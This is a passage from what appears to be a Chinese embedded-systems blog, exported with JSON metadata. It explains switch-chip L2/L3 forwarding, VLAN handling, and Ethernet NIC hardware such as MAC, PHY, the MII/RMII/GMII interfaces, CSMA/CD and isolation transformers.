Managed Learning (CML)的设置，是通过硬件学习，还是传给cpu，还是丢弃。 下一阶段是目的mac地址查找。如果在L2_USER_ENTRY中找到，数据包的目的地址要基于BPDU设置。如果BPDU设置为0，数据包将根据目的module、目的端口进行转发；如果BPDU设置为，数据将被丢弃、或拷贝给cpu、或洪泛到vlan中。如果在L2_USER_ENTRY中没有找到，但在L2_ENTRY table中找到了，将会转发到DST_MODID 、DST_PORT/TGID。否则，则洪泛到整个vlan中。 当数据包是多播包时，经过的路径与单播包一样。当多播包在L2_ENTRY中找到，L2_ENTRY的索引将用来确定L2MC table的索引。L2MC table用于映射出端口，当PFM为0时，将洪泛到整个vlan中，当PFM为1是，将转发给L2MC table中指定的端口。 对于多播包，经过的路径与单播包一样，只是在学习之后，将报文转发给该vlan的所有成员。 2）3层入口数据包流 如果查目的MAC地址表的时候发现L3bit置位了，就进入到L3转发流程。L3交换可以实现跨VLAN转发，而且它的转发依据不是根据目的MAC地址，而是根据目的IP。L3转发的流程是： 首先对L3头部进行校验，校验和错的包直接丢弃；然后进行原IP地址查找，如果主机路由表中没有找到，会上报给CPU，CPU会进行相应的处理，并更新接口表； 下一步进行目的IP地址查找，如果主机路由表中没有找到，就会在子网路由表中进行查找，在子网路由表中进行最长子网匹配的查找算法，如果在子网路由表中还没有找到，也送给CPU进行处理，如果在主机路由表或子网路由表中找到了，就会得到下一跳的指针。如果ECMP使能的话，会得到ECMP的指针和ECMP的个数，从而根据hash算法得到一个下一跳指针。下一条表项中包含了下一跳的MAC地址和接口表的索引。在包转发出去的时候，用下一跳的MAC地址替换掉包的目的MAC地址。用接口表中的MAC地址和VLAN替换掉包的原MAC地址和VLAN。 L2 功能介绍 主要包括： • “Learning” （mac地址学习） • “L2 Address Aging” （2层地址老化） • “L2 Address Learning Limits” （2层地址学习限制） • “L2 Multicast” （2层多播） • “L2 User Entry” （2层用户登记） • “L2 Port Bridge” （2层端口桥） • “Spanning Tree” （生成树） Learning L2_ENTRY表中包含三种不同的类型： VLAN-based bridging (basic), single-VLAN cross connect, and double-VLAN cross connect. 当CPU managed Learning (CML)模式设置时，硬件mac地址学习使能。通过CML_FLAGS_NEW和CML_FLAGS_MOVE控制CML，CML_FLAGS_NEW用来控制数据包中mac地址不认识的情况，CML_FLAGS_MOVE用来控制入口的数据包的mac地址与2层表中记录的该端口mac地址不相同的情况。有四种处理方式：HW学习包、pending学习、拷贝给cpu、丢弃。 L2_MOD_FIFO有128条记录，用于向cpu通知L2_ENTRY 表发生了变化，L2_MOD_FIFO表中存储了L2_ENTRY表的改变。 2）L2 Address Aging 通过L2_AGE_TIMER寄存器来使能老化，和设置老化时间。 3）L2 Address Learning Limits 设置每端口/每LAG，每VLAN与每芯片地址学习限制： - 每芯片地址学习限制与当前学习的MAC数量统计 - 28个端口,每端口可设学习限制，当前学习的MAC统计； - 128 个LAG，每LAG可设学习限制，当前学习MAC统计； - 4095 VLAN，每VLAN可设学习限制，当前学习MAC统计； 支持使能地址限制Check功能： 数据包分别经过system limit，port/LAG limit, VLAN limit逐级检查，如限制门限达到，丢掉该数据包；也可选送CPU； 4）L2 Multicast 支持三种PFM模式 (port filtering modes)： PFM A, 所有组播包在VLAN域内广播； PFM B, 已知组播转发至组播表的pbmp端口;未知组播则在VLAN域内广播; PFM C,已知组播转发至组播表的pbmp端口;未知组播则丢弃; 5）L2 User Entry L2_USER_ENTRY表包含64条表项，关键值是MAC_DA 、VLAN_ID。 6）L2 Port Bridge 允许收发包是同一个端口。典型的应用是Wireless Access Point (WAP)。同一个端口可以对应多个mac。 7）Spanning Tree 完全支持IEEE 802.1D(STP),IEEE 802.1s(MSTP), IEEE 802.1W(RSTP): - 支持端口状态设置: disable, blocking, listening, learning , forwarding; - 以上的2层功能，支持生成树必要的条件:学习,老化与MAC地址表的批量删除; - 支持256 生成树表项。 VLAN Internal VLAN ID获取 提供并根据以下排列优先顺序的几种表用于获取Internal VLAN ID: * &lt;div style=&quot;text-align: justify&quot;&gt;&lt;span style=&quot;font-family:幼圆&quot;&gt;VLAN Translation。以数据包的Inner/Outer VID为索引；每端口可选设置时能; MAC-Based。以数据包的源MAC地址为索引；每端口可选设置时能； Subnet-Based。以数据包的源IP为索引；每端口可选设置时能； Protocol-Based。以数据包的协议类型( ETHNET_TYPE )为索引；每端口可选设置时能； Port-Based。以端口配置的默认VLANID作为Internal VLAN； 对于Untagged与single priority-tagged packet ，查找的类型表以及优先顺序为MAC-Based - &gt; Subnet-Based -&gt; Protocol-Based -&gt;Port-Base; 对tagged packet,查找顺序为 VLAN Translation -&gt; MAC-Based - &gt; Subnet-Based -&gt; Protocol-Based -&gt;Port-Base; Ingress VLAN Action 查表结果，对数据包执行以下的VID转换规则： - Add Internal OVID/IVID - Replace incoming OVID/IVID with internal OVID/IVID - Delete incoming OVID/IVID - Do not modify 使用VLAN_XLATE表 Egress VLAN Action 在出口端，根据OutVid/InnerVid 查找Egress VLAN Translation, 执行以下相应操作(根据untagged与tagged包类型): - Add OVID/IVID - Replace OVID/IVID with internal/outgoing OVID/IVID - Delete OVID/IVID - Do not modify 通过EGR_VLAN表配置，对数据包进行强制剥离外层VID;用于Double-tagged模式; VLAN Range Checking 支持128个VLAN Range表。通过Range表的配置，将某段范围的userVID替换成一个OVID，节省VLAN表与其他资源VLAN Transparent表项的资源； VLAN Range执行优于Ingress VLAN Translation; VLAN tag操作流程 转：http://blog.chinaunix.net/uid-11140746-id-3712645.html","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"网口扫盲","slug":"EMBEDDED/网口扫盲","date":"2016-07-14T06:02:30.000Z","updated":"2017-07-10T08:47:16.405Z","comments":true,"path":"EMBEDDED/网口扫盲.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/网口扫盲.html","excerpt":"网口扫盲一:网卡初步认识 网络适配器又称网卡或网络接口卡(NIC),英文名Network Interface Card.它是使计算机联网的设备.平常所说的网卡就是将PC机和LAN连接的网络适配器.网卡(NIC) 插在计算机主板插槽中,负责将用户要传递的","text":"网口扫盲一:网卡初步认识 网络适配器又称网卡或网络接口卡(NIC),英文名Network Interface Card.它是使计算机联网的设备.平常所说的网卡就是将PC机和LAN连接的网络适配器.网卡(NIC) 插在计算机主板插槽中,负责将用户要传递的数据转换为网络上其它设备能够识别的格式,通过网络介质传输.数据在计算机总线中传输是并行方式即数据是肩并肩传输的,而在网络的物理缆线中说数据以串行的比特流方式传输的,网卡承担串行数据和并行数据间的转换.网卡在发送数据前要同接收网卡进行对话以确定最大可发送数据的大小,发送的数据量的大小,两次发送数据间的间隔,等待确认的时间,每个网卡在溢出前所能承受的最大数据量,数据传输的速度. 它的主要技术参数为带宽,总线方式,电气接口方式等.它的基本功能为:从并行到串行的数据转换,包的装配和拆装,网络存取控制,数据缓存和网络信号. 网卡的主要工作原理:发送数据时, 计算机把要传输的数据并行写到网卡的缓存,网卡对要传输的数据进编码(10M以太网使用曼切斯特码,100M 以太网使用差分曼切斯特码), 串行发到传输介质上.接收数据时, 则相反. 1. 网卡的基本构造 以最常见的PCI 接口的网卡为例,一块网卡主要由 PCB 线路板,主芯片,数据汞,金手指(总线插槽接口) ,BOOTROM,EEPROM,晶振,RJ45接口,指示灯,固定片等等,以及一些二极管,电阻电容等组成.网卡包括硬件和固件程序(只读存储器中的软件例程),该固件程序实现逻辑链路控制和媒体访问控制的功能,还记录唯一的硬件地址即mac地址,网卡上一般有缓存.网卡须分配中断irq及基本i/o端口地址,同时还须设置基本内存地址(base memory address)和收发器(transceiver) 网卡的控制芯片:网卡中最重要元件,是网卡的控制中心,有如电脑的cpu,控制着整个网卡的工作,负责数据的传送和连接时的信号侦测.早期的10/100Mbps的双速网卡会采用两个控制芯片(单元)分别用来控制两个不同速率环境下的运算,而目前较先进的产品通常只有一个芯片控制两种速度. 常见的 10/100/1000M bps自适应网卡芯片有 Intel 的8254 系列,Broadcom 的BCM57**系列,Marvell的88E8001/88E8053/88E806系列,Realtek的RTL8169S-32/64,RTL8110S-32/64(LOM),RTL8169SB,RTL8110SB(LOM) ,RTL8168(PCI Express) ,RTL8111(LOM,PCI Express) 系列,VIA 的VT612*系列等等. 晶体震荡器:负责产生网卡所有芯片的运算时钟,其原理就象主板上的晶体震荡器一样,通常网卡是使用20或25hz的晶体震荡器.千兆网卡使用62.5MHz或者125MHz晶振. 1. &lt;div style=&quot;background: white&quot;&gt;&lt;span style=&quot;color:#4b4b4b; font-family:幼圆; font-size:9pt&quot;&gt;boot rom插槽:如无特殊要求网卡中的这个插槽处在空置状态.一般是和boot rom芯片搭配使用,其主要作用是引导电脑通过服务器引导进入操作系统.boot rom就是启动芯片,让电脑可以在不具备硬盘,软驱和光驱的情况下,直接通过服务器开机,成为一个无硬盘无软驱的工作站.没有软驱就无法将资料输出,这样也可以达到资料保密的功能.同时,还可以节省下购买这些电脑部件的费用.在使用boot rom时要注意自己使用何种网络操作系统,通常有boot rom for nt,boot rom for unix,boot rom for netware等,boot rom启动芯片要自行购买. eeprom:从前的老式网卡都要靠设置跳线或是dip开关来设定irq,dma和i/o port等值,而现在的网卡则都使用软件设定,几乎看不见跳线的存在.各种网卡的状态和网卡的信息等数据都存在这颗小小的eeprom里,通过它来自动设置.里面记录了网卡芯片的供应商ID,子系 统供应商ID,网卡的MAC地址,网卡的一些配置,如SMI总线上PHY的地址,BOOTROM的容量, 是否启用BOOTROM引导系统等东西 数据汞:这是消费级PCI 网卡上都具备的设备,数据汞也被叫做网络变压器或可称为网络隔离变压器.它在一块网卡上所起的作用主要有两个,一是传输数据,它把 PHY 送出来的差分信号用差模耦合的线圈耦合滤波以增强信号,并且通过电磁场的转换耦合到不同电平的连接网线的另外一端;一是隔离网线连接的不同网络设备间的不同电平,以防止不同电压通过网线传输损坏设备.除此而外,数据汞还能对设备起到一定的防雷保护作用. rj-45和bnc接头: rj-45是采用双绞线作为传输媒介的一种网卡接口,在100mbps网中最常应用.bnc是采用细同轴电缆作为传输媒介. 信号指示灯:在网卡后方会有二到三个不等的信号灯,其作用是显示目前网络的连线状态,通常具有tx和rx两个信息.tx代表正在送出资料,rx代表正在接收资料,若看到两个灯同时亮则代表目前是处于全双工的运作状态,也可由此来辨别全双工的网卡是否处于全双工的网络环境中.也有部分低速网卡只用一个灯来表示信号,通过不同的灯光变换来表示网络是否导通. WOL:有些网卡会有WOL的功能, WOL网络开机的功能(wake on line).它可由另外一台电脑,使用软件制作特殊格式的信息包发送至一台装有具wol功能网卡的电脑,而该网卡接收到这些特殊格式的信息包后,就会命令电脑打开电源,目前已有越来越多的网卡支持网络开机的功能. 2. 网卡的分类 以传输速率可分为: 10Mbps网卡,100Mbps网卡,1000Mbps网卡,10GMbps网卡.目前常见的三种架构有10baset,100basetx与base2,前两者是以rj-45双绞线为传输媒介,传输速率分别为10Mbps和100Mbps.而双绞线又分为category 1至category 5五种规格,分别有不同的用途以及频宽,category通常简称cat,只要使用cat5规格的双绞线皆可用于10/100mbps的网卡上.而10base2架构则是使用细同轴电缆作为传输媒介,传输速率只有10Mbps.这里提到的10Mbps或100Mbps是指网卡上的最大传送速率,而并不等于网络上实际的传送速度,实际速度要考虑到传送的距离,线路的品质,和网络上是否拥挤等因素,这里所谈的bps指的是每秒传送的bit(1个byte=8个bit).而100Mbps则称为高速以太网卡(fast ethernet),多为PCI/PCI-E接口.当前市面上的pci网卡多具有10/100/1000Mbps自动切换的功能,会根据所在的网络连线环境来自动调节网络速度.1000 Mbps以太网卡多用于交换机或交换机与服务器之间的高速链路或backbone. 以接口类型可分为: ISA接口网卡,PCI/ PCI-X/ PCI-E接口网卡,USB接口网卡和笔记本电脑专用的PCMCIA接口.现在的ISA接口的网卡均采用16bit的总线宽度,其特性是采用programmed i/o的模式传送资料,传送数据时必须通过cpu在i/o上开出一个小窗口,作为网卡与pc之间的沟通管道,需要占用较高的cpu使用率,在传送大量数据时效率较差. PCI接口的网卡则采用32bit的总线频宽,采用bus master的数据传送方式,传送数据是由网卡上的控制芯片来控制,不必通过i/o端口和cpu,可大幅降低cpu的占用率,目前产品多为10/100Mbps双速自动侦测切换网卡. 以传输方式可分为: 半双工网卡,全双工网卡.半双工网卡无法同一时间内完成接收与传送数据的动作,如10base2使用细同轴电缆的网络架构就是半双工网络,同一时间内只能进行传送或接收数据的工作,效率较低.要使用全双工的网络就必须要使用双绞线作为传输线才能达到,并且也要搭配使用全双工的集线器,要使用10base或100basetx的网络架构,网卡当然也要是全双工的产品. 以传输介质可分为: rj-45双绞线的网卡与bnc的同轴电缆两种,有的网卡同时具有两种接头,可适用于两种网络线,但无法两个接头同时使用.另外还有光纤接口的网卡,通常带宽在1000 Mbps. 其它网卡: 从网络传输的物理媒介上还有无线网卡,利用2.4GHz的无线电波来传输数据.目前ieee有两种规范802.11和802.11b,最高传输速率分别为2Mbps和11Mbps,接口有PCI,USB和PCMCIA几种. &lt;/span&gt;&lt;/span&gt; 网口扫盲二:Mac与Phy组成原理的简单分析 1. general 下图是网口结构简图.网口由CPU、MAC和PHY三部分组成.DMA控制器通常属于CPU的一部分,用虚线放在这里是为了表示DMA控制器可能会参与到网口数据传输中. 对于上述的三部分,并不一定都是独立的芯片,根据组合形式,可分为下列几种类型: CPU集成MAC与PHY; CPU集成MAC,PHY采用独立芯片; CPU不集成MAC与PHY,MAC与PHY采用集成芯片; 本例中选用方案二做进一步说明,因为CPU总线接口很常见,通常都会做成可以像访问内存一样去访问,没必要拿出来说,而Mac与PHY之间的MII接口则需要多做些说明. 下图是采用方案二的网口结构图.虚框表示CPU,MAC集成在CPU中.PHY芯片通过MII接口与CPU上的Mac连接. 在软件上对网口的操作通常分为下面几步: 为数据收发分配内存; 初始化MAC寄存器; 初始化PHY寄存器（通过MIIM）; 启动收发; 2. MII MII接口是MAC与PHY连接的标准接口.因为各厂家采用了同样的接口,用户可以根据所需的性能、价格,采用不同型号,甚至不同公司的phy芯片. 需要发送的数据通过MII接口中的收发两组总线实现.而对PHY芯片寄存器的配置信息,则通过MII总的一组串口总线实现,即MIIM（MII Management）. 下表列出了MII总线中主要的一些引脚 PIN NameDirectionDescriptionTXD[0:3]Mac to PhyTransmit DataTXENMac to PhyTransmit EnableTXCLKMac to PhyTransmit ClockRXD[0:3]Phy to MacReceive DataRXENPhy to MacReceive EnableRXCLKPhy to MacReceive ClockMDCMac to PhyManagement Data ClockMDIOBidirectionManagement Data I/O MIIM只有两个线, 时钟信号MDC与数据线MDIO.读写命令均由Mac发起, PHY不能通过MIIM主动向Mac发送信息.由于MIIM只能有Mac发起, 我们可以操作的也就只有MAC上的寄存器. 3. DMA 收发数据总是间费时费力的事,尤其对于网络设备来说更是如此.CPU做这些事情显然不合适.既然是数据搬移, 最简单的办法当然是让DMA来做.毕竟专业的才是最好的. 这样CPU要做的事情就简单了.只需要告诉DMA起始地址与长度, 剩下的事情就会自动完成. 通常在MAC中会有一组寄存器专门用户记录数据地址, tbase与rbase, cpu按MAC要的格式把数据放好后, 启动MAC的数据发送就可以了.启动过程常会用到寄存器tstate. 4. MAC CPU上有两组寄存器用与MAC.一组用户数据的收发,对应上面的DMA;一组用户MIIM,用户对PHY进行配置.两组寄存器由于都在CPU上,配置方式与其他CPU上寄存器一样,直接读写即可.数据的转发通过DMA完成. 5. PHY 该芯片是一个10M/100M Ethernet网口芯片 PHY芯片有一组寄存器用户保存配置,并更新状态.CPU不能直接访问这组寄存器,只能通过MAC上的MIIM寄存器组实现间接访问.同时PHY芯片负责完成MII总线的数据与Media Interface上数据的转发.该转发根据寄存器配置自动完成,不需要外接干预. 网口扫盲三:以太网芯片MAC和PHY的关系 &lt;span style=&quot;color:#666666; font-size:12pt&quot;&gt;问:如何实现单片以太网微控制器? 答:诀窍是将微控制器、以太网媒体接入控制器(MAC)和物理接口收发器(PHY)整合进同一芯片,这样能去掉许多外接元器件.这种方案可使MAC和PHY实现很好的匹配,同时还可减小引脚数、缩小芯片面积.单片以太网微控制器还降低了功耗,特别是在采用掉电模式的情况下. 问:以太网MAC是什么? 答:MAC即Media Access Control,即媒体访问控制子层协议.该协议位于OSI七层协议中数据链路层的下半部分,主要负责控制与连接物理层的物理介质.在发送数据的时候,MAC协议可以事先判断是否可以发送数据,如果可以发送将给数据加上一些控制信息,最终将数据以及控制信息以规定的格式发送到物理层;在接收数据的时候,MAC协议首先判断输入的信息并是否发生传输错误,如果没有错误,则去掉控制信息发送至LLC层.该层协议是以太网MAC由IEEE-802.3以太网标准定义.最新的MAC同时支持10Mbps和100Mbps两种速率. 以太网数据链路层其实包含MAC(介质访问控制)子层和LLC(逻辑链路控制)子层.一块以太网卡MAC芯片的作用不但要实现MAC子层和LLC子层的功能,还要提供符合规范的PCI界面以实现和主机的数据交换. MAC从PCI总线收到IP数据包(或者其他网络层协议的数据包)后,将之拆分并重新打包成最大1518Byte,最小64Byte的帧.这个帧里面包括了目标MAC地址、自己的源MAC地址和数据包里面的协议类型(比如IP数据包的类型用80表示).最后还有一个DWORD(4Byte)的CRC码. 可是目标的MAC地址是哪里来的呢?这牵扯到一个ARP协议(介乎于网络层和数据链路层的一个协议).第一次传送某个目的IP地址的数据的时候,先会发出一个ARP包,其MAC的目标地址是广播地址,里面说到：”谁是xxx.xxx.xxx.xxx这个IP地址的主人？”因为是广播包,所有这个局域网的主机都收到了这个ARP请求.收到请求的主机将这个IP地址和自己的相比较,如果不相同就不予理会,如果相同就发出ARP响应包.这个IP地址的主机收到这个ARP请求包后回复的ARP响应里说到:”我是这个IP地址的主人”.这个包里面就包括了他的MAC地址.以后的给这个IP地址的帧的目标MAC地址就被确定了.(其它的协议如IPX/SPX也有相应的协议完成这些操作.) IP地址和MAC地址之间的关联关系保存在主机系统里面,叫做ARP表,由驱动程序和操作系统完成.在Microsoft的系统里面可以用arp-a的命令查看ARP表.收到数据帧的时候也是一样,做完CRC以后,如果没有CRC效验错误,就把帧头去掉,把数据包拿出来通过标准的借口传递给驱动和上层的协议客栈,最终正确的达到我们的应用程序. 还有一些控制帧,例如流控帧也需要MAC直接识别并执行相应的行为. 以太网MAC芯片的一端接计算机PCI总线,另外一端就接到PHY芯片上,它们之间是通过MII接口链接的. 问:什么是MII? 答:MII即媒体独立接口,它是IEEE-802.3定义的以太网行业标准.”媒体独立”表明在不对MAC硬件重新设计或替换的情况下,任何类型的PHY设备都可以正常工作.它包括一个数据接口,以及一个MAC和PHY之间的管理接口. 数据接口包括分别用于发送器和接收器的两条独立信道.每条信道都有自己的数据,时钟和控制信号.MII数据接口总共需要16个信号,包括TX_ER,TXD&lt;3:0&gt;,TX_EN,TX_CLK, COL,RXD&lt;3:0&gt;,RX_EX,RX_CLK,CRS,RX_DV等.MII以4位半字节方式传送数据双向传输,时钟速率25MHz.其工作速率可达100Mb/s; MII管理接口是个双信号接口,一个是时钟信号,另一个是数据信号.通过管理接口,上层能监视和控制PHY.其管理是使用SMI(Serial Management Interface)总线通过读写PHY的寄存器来完成的.PHY里面的部分寄存器是IEEE定义的,这样PHY把自己的目前的状态反映到寄存器里面,MAC通过SMI总线不断的读取PHY的状态寄存器以得知目前PHY的状态,例如连接速度,双工的能力等.当然也可以通过SMI设置PHY的寄存器达到控制的目的,例如流控的打开关闭,自协商模式还是强制模式等.不论是物理连接的MII总线和SMI总线还是PHY的状态寄存器和控制寄存器都是有IEEE的规范的,因此不同公司的MAC和PHY一样可以协调工作.当然为了配合不同公司的PHY的自己特有的一些功能,驱动需要做相应的修改. MII支持10Mbps和100Mbps的操作,一个接口由14根线组成,它的支持还是比较灵活的,但是有一个缺点是因为它一个端口用的信号线太多,如果一个8端口的交换机要用到112根线,16端口就要用到224根线,到32端口的话就要用到448根线,一般按照这个接口做交换机,是不太现实的,所以现代的交换机的制作都会用到其它的一些从MII简化出来的标准,比如RMII,SMII,GMII等. RMII是简化的MII接口,在数据的收发上它比MII接口少了一倍的信号线,所以它一般要求是50MHz的总线时钟.RMII一般用在多端口的交换机,它不是每个端口安排收,发两个时钟,而是所有的数据端口公用一个时钟用于所有端口的收发,这里就节省了不少的端口数目.RMII的一个端口要求7个数据线,比MII少了一倍,所以交换机能够接入多一倍数据的端口.和MII一样,RMII支持10Mbps和100Mbps的总线接口速度. SMII是由思科提出的一种媒体接口,它有比RMII更少的信号线数目,S表示串行的意思.因为它只用一根信号线传送发送数据,一根信号线传输接受数据,所以为了满足100Mbps的总线接口速度的需求,它的时钟频率就达到了125MHz,为什么用125MHz,是因为数据线里面会传送一些控制信息.SMII一个端口仅用4根信号线完成100Mbps的传输,比起RMII差不多又少了一倍的信号线.SMII在工业界的支持力度是很高的.同理,所有端口的数据收发都公用同一个外部的125MHz时钟. GMII是千兆网的MII接口,这个也有相应的RGMII接口,表示简化了的GMII接口. MII总线 在IEEE802.3中规定的MII总线是一种用于将不同类型的PHY与相同网络控制器(MAC)相连接的通用总线.网络控制器可以用同样的硬件接口与任何PHY . GMII(Gigabit MII) GMII采用8位接口数据,工作时钟125MHz,因此传输速率可达1000Mbps.同时兼容MII所规定的10/100 Mbps工作方式. GMII接口数据结构符合IEEE以太网标准.该接口定义见IEEE 802.3-2000. 发送器: GTXCLK——吉比特TX..信号的时钟信号(125MHz) TXCLK——10/100Mbps信号时钟 TXD[7..0]——被发送数据 TXEN——发送器使能信号 TXER——发送器错误(用于破坏一个数据包) 注:在千兆速率下,向PHY提供GTXCLK信号,TXD,TXEN,TXER信号与此时钟信号同步.否则,在10/100Mbps速率下,PHY提供TXCLK时钟信号,其它信号与此信号同步.其工作频率为25MHz(100M网络)或2.5MHz(10M网络). 接收器: RXCLK——接收时钟信号(从收到的数据中提取,因此与GTXCLK无关联) RXD[7..0]——接收数据 RXDV——接收数据有效指示 RXER——接收数据出错指示 COL——冲突检测(仅用于半双工状态) 管理配置 MDC——配置接口时钟 MDIO——配置接口I/O 管理配置接口控制PHY的特性.该接口有32个寄存器地址,每个地址16位.其中前16个已经在”IEEE 802.3,2000-22.2.4 Management Functions”中规定了用途,其余的则由各器件自己指定. RMII(Reduced Media Independant Interface)简化媒体独立接口是标准的以太网接口之一,比MII有更少的I/O传输. RMII口是用两根线来传输数据的,MII口是用4根线来传输数据的,GMII是用8根线来传输数据的.MII/RMII只是一种接口,对于10Mbps线速,MII的时钟速率是2.5MHz就可以了,RMII则需要5MHz;对于100Mbps线速,MII需要的时钟速率是25MHz,RMII则是50MHz. MII/RMII用于传输以太网包,在MII/RMII接口是4/2bit的,在以太网的PHY里需要做串并转换,编解码等才能在双绞线和光纤上进行传 输,其帧格式遵循IEEE 802.3(10M)/IEEE 802.3u(100M)/IEEE 802.1q(VLAN).以太网帧的格式为:前导符+开始位+目的mac地址+源mac地址+类型/长度+数据+padding(optional)+32bitCRC如果有vlan,则要在类型/长度后面加上2个字节的vlan tag,其中12bit来表示vlan id,另外4bit表示数据的优先级! 问:以太网PHY是什么? 答:PHY是物理接口收发器,它实现物理层.IEEE-802.3标准定义了以太网PHY.包括MII/GMII(介质独立接口)子层,PCS(物理编码子层),PMA(物理介质附加)子层,PMD(物理介质相关)子层,MDI子层.它符合IEEE-802.3k中用于10BaseT(第14条)和100BaseTX(第24条和第25条)的规范. PHY在发送数据的时候,收到MAC过来的数据(对PHY来说,没有帧的概念,对它来说,都是数据而不管什么地址,数据还是CRC.对于100BaseTX因为使用4B/5B编码,每4bit就增加1bit的检错码),然后把并行数据转化为串行流数据,再按照物理层的编码规则把数据编码,再变为模拟信号把数据送出去.收数据时的流程反之.PHY还有个重要的功能就是实现CSMA/CD的部分功能.它可以检测到网络上是否有数据在传送,如果有数据在传送中就等待,一旦检测到网络空闲,再等待一个随机时间后将送数据出去.如果两个碰巧同时送出了数据,那样必将造成冲突,这时候,冲突检测机构可以检测到冲突,然后各等待一个随机的时间重新发送数据.这个随机时间很有讲究的,并不是一个常数,在不同的时刻计算出来的随机时间都是不同的,而且有多重算法来应付出现概率很低的同两台主机之间的第二次冲突. 许多网友在接入Internt宽带时,喜欢使用”抢线”强的网卡,就是因为不同的PHY碰撞后计算随机时间的方法设计上不同,使得有些网卡比较”占便宜”.不过,抢线只对广播域的网络而言的,对于交换网络和ADSL这样点到点连接到局端设备的接入方式没什么意义.而且”抢线”也只是相对而言的,不会有质的变化. 现在交换机的普及使得交换网络的普及,使得冲突域网络少了很多,极大地提高了网络的带宽.但是如果用HUB,或者共享带宽接入Internet的时候还是属于冲突域网络,有冲突碰撞的.交换机和HUB最大的区别就是:一个是构建点到点网络的局域网交换设备,一个是构建冲突域网络的局域网互连设备. 除此之外PHY还提供了和对端设备连接的重要功能并通过LED灯显示出自己目前的连接的状态和工作状态让我们知道.当我们给网卡接入网线的时候,PHY不断发出的脉冲信号检测到对端有设备,它们通过标准的”语言”交流,互相协商并却定连接速度、双工模式、是否采用流控等.通常情况下,协商的结果是两个设备中能同时支持的最大速度和最好的双工模式.这个技术被称为AutoNegotiation或者NWAY,它们是一个意思–自动协商. 具体传输过程为,发送数据时,网卡首先侦听介质上是否有载波(载波由电压指示),如果有,则认为其他站点正在传送信息,继续侦听介质.一旦通信介质在一定时间段内(称为帧间缝隙IFG=9.6微秒)是安静的,即没有被其他站点占用,则开始进行帧数据发送,同时继续侦听通信介质,以检测冲突.在发送数据期间,如果检测到冲突,则立即停止该次发送,并向介质发送一个”阻塞”信号,告知其他站点已经发生冲突,从而丢弃那些可能一直在接收的受到损坏的帧数据,并等待一段随机时间(CSMA/CD确定等待时间的算法是二进制指数退避算法).在等待一段随机时间后,再进行新的发送.如果重传多次后(大于16次)仍发生冲突,就放弃发送.接收时,网卡浏览介质上传输的每个帧,如果其长度小于64字节,则认为是冲突碎片.如果接收到的帧不是冲突碎片且目的地址是本地地址,则对帧进行完整性校验,如果帧长度大于1518字节(称为超长帧,可能由错误的LAN驱动程序或干扰造成)或未能通过CRC校验,则认为该帧发生了畸变.通过校验的帧被认为是有效的,网卡将它接收下来进行本地处理. 问:造成以太网MAC和PHY单片整合难度高的原因是什么? 答:PHY整合了大量模拟硬件,而MAC是典型的全数字器件.芯片面积及模拟/数字混合架构是为什么先将MAC集成进微控制器而将PHY留在片外的原因.更灵活、密度更高的芯片技术已经可以实现MAC和PHY的单芯片整合. 问: 网卡上除RJ-45接口外,还需要其它元件吗? 答:PHY和MAC是网卡的主要组成部分,网卡一般用RJ-45插口,10M网卡的RJ-45插口也只用了1,2,3,6四根针,而100M或1000M网卡的则是八根针都是全的.除此以外,还需要其它元件,因为虽然PHY提供绝大多数模拟支持,但在一个典型实现中,仍需外接6,7只分立元件及一个局域网绝缘模块.绝缘模块一般采用一个1：1的变压器.这些部件的主要功能是为了保护PHY免遭由于电气失误而引起的损坏. 另外,一颗CMOS制程的芯片工作的时候产生的信号电平总是大于0V的(这取决于芯片的制程和设计需求),但是这样的信号送到100米甚至更长的地方会有很大的直流分量的损失.而且如果外部网线直接和芯片相连的话,电磁感应(打雷)和静电,很容易造成芯片的损坏.再就是设备接地方法不同,电网环境不同会导致双方的0V电平不一致,这样信号从A传到B,由于A设备的0V电平和B点的0V电平不一样,这样会导致很大的电流从电势高的设备流向电势低的设备. 为了解决以上问题Transformer(隔离变压器)这个器件就应运而生.它把PHY送出来的差分信号用差模耦合的线圈耦合滤波以增强信号,并且通过电磁场的转换耦合到连接网线的另外一端.这样不但使网线和PHY之间没有物理上的连接而换传递了信号,隔断了信号中的直流分量,还可以在不同0V电平的设备中传送数据. 隔离变压器本身就是设计为耐2KV~3KV的电压的.也起到了防雷感应(我个人认为这里用防雷击不合适)保护的作用.有些朋友的网络设备在雷雨天气时容易被烧坏,大都是PCB设计不合理造成的,而且大都烧毁了设备的接口,很少有芯片被烧毁的,就是隔离变压器起到了保护作用. 隔离变压器本身是个被动元件,只是把PHY的信号耦合了到网线上,并没有起到功率放大的作用.那么一张网卡信号的传输的最长距离是谁决定的呢? 一张网卡的传输最大距离和与对端设备连接的兼容性主要是PHY决定的.但是可以将信号送的超过100米的PHY其输出的功率也比较大,更容易产生EMI的问题.这时候就需要合适的Transformer与之配合.作PHY的老大公司Marvell的PHY,常常可以传送180~200米的距离,远远超过IEEE的100米的标准. RJ-45的接头实现了网卡和网线的连接.它里面有8个铜片可以和网线中的4对双绞(8根)线对应连接.其中100M的网络中1,2是传送数据的,3,6是接收数据的.1,2之间是一对差分信号,也就是说它们的波形一样,但是相位相差180度,同一时刻的电压幅度互为正负.这样的信号可以传递的更远,抗干扰能力强.同样的,3,6也一样是差分信号. 网线中的8根线,每两根扭在一起成为一对.我们制作网线的时候,一定要注意要让1,2在其中的一对,3,6在一对.否则长距离情况下使用这根网线的时候会导致无法连接或连接很不稳定. 现在新的PHY支持AUTO MDI-X功能(也需要Transformer支持).它可以实现RJ-45接口的1,2上的传送信号线和3,6上的接收信号线的功能自动互相交换.有的PHY甚至支持一对线中的正信号和负信号的功能自动交换.这样我们就不必为了到底连接某个设备需要使用直通网线还是交叉网线而费心了.这项技术已经被广泛的应用在交换机和SOHO路由器上. 在1000Basd-T网络中,其中最普遍的一种传输方式是使用网线中所有的4对双绞线,其中增加了4,5和7,8来共同传送接收数据.由于1000Based-T网络的规范包含了AUTOMDI-X功能,因此不能严格确定它们的传出或接收的关系,要看双方的具体的协商结果. 一片网卡主要功能的实现就基本上是上面这些器件了. 其他的,还有一颗EEPROM芯片,通常是一颗93C46.里面记录了网卡芯片的供应商ID,子系统供应商ID,网卡的MAC地址,网卡的一些配置,如SMI总线上PHY的地址,BOOTROM的容量,是否启用BOOTROM引导系统等东西. 